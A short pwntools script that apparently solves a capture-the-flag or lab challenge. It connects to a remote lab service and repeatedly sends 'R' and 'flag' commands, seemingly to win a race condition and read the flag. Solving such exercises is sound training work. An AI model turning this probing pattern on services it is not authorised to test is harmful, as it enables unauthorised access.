#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

if __name__ == "__main__":
    r = remote('up.zoolab.org', 10931)
    msg = r.recvuntil(b'it.').decode()
    print(msg)
    for i in range(100):  
        r.sendline(b'R')
        print(r.recvline().decode())
        r.sendline(b'flag')
        print(r.recvline().decode())
    r.close()
    